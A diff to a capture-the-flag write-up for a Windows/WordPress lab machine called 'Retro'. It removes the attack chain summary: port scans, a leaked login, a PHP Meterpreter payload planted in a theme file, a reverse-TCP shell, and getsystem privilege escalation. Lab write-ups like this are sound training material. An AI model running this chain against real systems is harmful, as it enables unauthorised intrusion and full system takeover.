@@ -18,8 +18,7 @@
 7. [Privilege Escalation — getsystem (PrintSpooler)](#7-privilege-escalation--getsystem-printspooler)
 8. [Flag Capture](#8-flag-capture)
 9. [Flags & Answers Summary](#9-flags--answers-summary)
-10. [Attack Chain Summary](#10-attack-chain-summary)
-11. [Tools Used](#11-tools-used)
+10. [Tools Used](#10-tools-used)
 
 ---
 
@@ -405,52 +404,7 @@ C:\Users\Administrator\Desktop> type root.txt.txt
 
 ---
 
-## 10. Attack Chain Summary
-
-```
-[1] Nmap -Pn -p-
-        → Port 80 (IIS), Port 3389 (RDP)
-
-[2] Nmap -sC -sV -A
-        → Windows Server 2016, hostname RETROWEB, IIS 10.0
-
-[3] Gobuster dir /
-        → /retro (Status: 301)
-
-[4] Gobuster dir /retro
-        → /wp-login.php, /wp-content → WordPress confirmed
-
-[5] Browse /retro
-        → Blog "Retro Fanatics", author: Wade
-        → Comment leak: "parzival" → credentials wade:parzival
-
-[6] Login /retro/wp-login.php
-        → WordPress admin access granted
-
-[7] Appearance → Theme Editor → 404.php
-        → Inject PHP Meterpreter payload
-        → Trigger via: /wp-content/themes/twentyseventeen/404.php
-
-[8] msfconsole multi/handler (port 5555)
-        → PHP Meterpreter session (unstable)
-
-[9] msfvenom → shell.exe (windows/x64/meterpreter/reverse_tcp)
-        → upload + execute from PHP shell
-
-[10] msfconsole multi/handler (port 4444)
-        → Stable Windows native Meterpreter session
-
-[11] getsystem
-        → Technique 5: Named Pipe Impersonation (PrintSpooler)
-        → NT AUTHORITY\SYSTEM
-
-[12] type C:\Users\Wade\Desktop\user.txt.txt          → user flag ✓
-     type C:\Users\Administrator\Desktop\root.txt.txt → root flag ✓
-```
-
----
-
-## 11. Tools Used
+## 10. Tools Used
 
 | Tool | Purpose |
 |---|---|
